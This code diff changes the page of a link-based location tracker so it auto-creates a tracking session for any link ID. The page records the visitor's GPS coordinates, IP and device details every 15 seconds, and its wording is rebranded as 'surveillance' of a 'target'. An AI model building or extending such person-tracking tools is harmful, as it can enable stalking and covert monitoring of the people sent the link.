@@ -9,7 +9,7 @@ import {
   getIPAddress,
   getCurrentPosition,
   getGeolocationErrorMessage,
-  getTracker,
+  getOrCreateTracker,
   addLocationToTracker,
 } from '@/lib/storage';
 import styles from './page.module.css';
@@ -30,19 +30,22 @@ function TrackerContent() {
   const trackingId = searchParams.get('id');
 
   const [status, setStatus] = useState<Status>('loading');
-  const [statusMessage, setStatusMessage] = useState('Requesting location access...');
+  const [statusMessage, setStatusMessage] = useState('Initializing tracking system...');
   const [locationData, setLocationData] = useState<LocationData | null>(null);
   const [deviceInfo, setDeviceInfo] = useState<DeviceInfo | null>(null);
-  const [ipAddress, setIpAddress] = useState('Loading...');
-  const [trackerExists, setTrackerExists] = useState(true);
+  const [ipAddress, setIpAddress] = useState('Scanning...');
   const [updateCount, setUpdateCount] = useState(0);
   const [lastUpdate, setLastUpdate] = useState<Date | null>(null);
+  const [trackerInitialized, setTrackerInitialized] = useState(false);
   const intervalRef = useRef<NodeJS.Timeout | null>(null);
 
-  // Save location to localStorage
+  // Initialize tracker if needed and save location
   const saveLocationToStorage = useCallback((data: LocationData) => {
     if (!trackingId) return false;
 
+    // Ensure tracker exists (creates if not)
+    getOrCreateTracker(trackingId);
+    
     const success = addLocationToTracker(trackingId, data);
     if (success) {
       setUpdateCount((prev) => prev + 1);
@@ -54,7 +57,7 @@ function TrackerContent() {
   const fetchLocation = useCallback(async (isAutoUpdate = false) => {
     if (!isAutoUpdate) {
       setStatus('loading');
-      setStatusMessage('Requesting location access...');
+      setStatusMessage('Acquiring target coordinates...');
     }
 
     try {
@@ -75,10 +78,10 @@ function TrackerContent() {
       setDeviceInfo(device);
       setIpAddress(ip);
       setStatus('success');
-      setStatusMessage('Location captured successfully!');
+      setStatusMessage('Target location acquired');
 
       // Save to localStorage
-      if (trackingId && trackerExists) {
+      if (trackingId) {
         saveLocationToStorage(data);
       }
     } catch (error) {
@@ -87,31 +90,25 @@ function TrackerContent() {
       } else if (error instanceof Error) {
         setStatusMessage(error.message);
       } else {
-        setStatusMessage('An unknown error occurred.');
+        setStatusMessage('Signal acquisition failed.');
       }
       setStatus('error');
     }
-  }, [trackingId, trackerExists, saveLocationToStorage]);
+  }, [trackingId, saveLocationToStorage]);
 
-  // Check if tracker exists in localStorage
-  const checkTrackerExists = useCallback(() => {
-    if (!trackingId) return;
-
-    const tracker = getTracker(trackingId);
-    if (!tracker) {
-      setTrackerExists(false);
+  // Initialize tracker
+  useEffect(() => {
+    if (trackingId && !trackerInitialized) {
+      // Auto-create tracker if it doesn't exist
+      getOrCreateTracker(trackingId);
+      setTrackerInitialized(true);
     }
-  }, [trackingId]);
+  }, [trackingId, trackerInitialized]);
 
   useEffect(() => {
     const device = getDeviceInfo();
     setDeviceInfo(device);
     getIPAddress().then(setIpAddress);
-
-    // Check if tracker exists in localStorage
-    if (trackingId) {
-      checkTrackerExists();
-    }
 
     // Initial location fetch
     fetchLocation();
@@ -128,7 +125,7 @@ function TrackerContent() {
         clearInterval(intervalRef.current);
       }
     };
-  }, [trackingId, fetchLocation, checkTrackerExists]);
+  }, [trackingId, fetchLocation]);
 
   const mapUrl = locationData
     ? `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}&z=15&output=embed`
@@ -137,16 +134,13 @@ function TrackerContent() {
   return (
     <div className={styles.gradientBg}>
       <div className={styles.container}>
-        <h1>📍 Location Tracker</h1>
-        <p className={styles.subtitle}>Share your location securely</p>
+        <h1>🎯 Cyber Tracker</h1>
+        <p className={styles.subtitle}>Real-time geolocation surveillance system</p>
 
-        {!trackerExists && trackingId && (
-          <div className={`status error`}>
-            ⚠️ Tracker not found. The tracking link may be invalid or expired.
-            <br />
-            <Link href="/login" className={styles.dashboardLink}>
-              Go to Dashboard to create a new tracker →
-            </Link>
+        {trackingId && (
+          <div className={styles.trackerInfo}>
+            <p>🔗 <strong>Active Session:</strong> {trackingId.substring(0, 20)}...</p>
+            <p>📡 Location data is being recorded to this session</p>
           </div>
         )}
 
@@ -157,13 +151,13 @@ function TrackerContent() {
           {statusMessage}
         </div>
 
-        {trackingId && trackerExists && status === 'success' && (
+        {trackingId && status === 'success' && (
           <div className={styles.autoUpdateStatus}>
             <div className={styles.pulse}></div>
-            <span>Auto-updating every 15 seconds</span>
+            <span>Live tracking active • 15s intervals</span>
             {updateCount > 0 && (
               <span className={styles.updateCount}>
-                ({updateCount} updates saved)
+                [{updateCount} updates]
               </span>
             )}
             {lastUpdate && (
@@ -207,12 +201,12 @@ function TrackerContent() {
             </div>
 
             <button className="btn btn-rounded" onClick={() => fetchLocation()}>
-              🔄 Refresh Location
+              🔄 Refresh Coordinates
             </button>
 
             {deviceInfo && (
               <div className="device-info">
-                <h3>Device Information</h3>
+                <h3>📱 Device Intel</h3>
                 <div className="device-details">
                   <div className="device-item">
                     <span className="device-label">Browser:</span>
@@ -238,7 +232,7 @@ function TrackerContent() {
                     <span className="device-label">User Agent:</span>
                     <span
                       className="device-value"
-                      style={{ fontSize: '11px', wordBreak: 'break-all' }}
+                      style={{ fontSize: '10px', wordBreak: 'break-all' }}
                     >
                       {deviceInfo.userAgent}
                     </span>
@@ -250,7 +244,7 @@ function TrackerContent() {
         )}
 
         <Link href="/login" className={styles.backLink}>
-          ← Back to Dashboard
+          ← Return to Command Center
         </Link>
       </div>
     </div>
@@ -262,8 +256,8 @@ export default function TrackerPage() {
     <Suspense fallback={
       <div className={styles.gradientBg}>
         <div className={styles.container}>
-          <h1>📍 Location Tracker</h1>
-          <p className={styles.subtitle}>Loading...</p>
+          <h1>🎯 Cyber Tracker</h1>
+          <p className={styles.subtitle}>Initializing system...</p>
           <div className="spinner"></div>
         </div>
       </div>
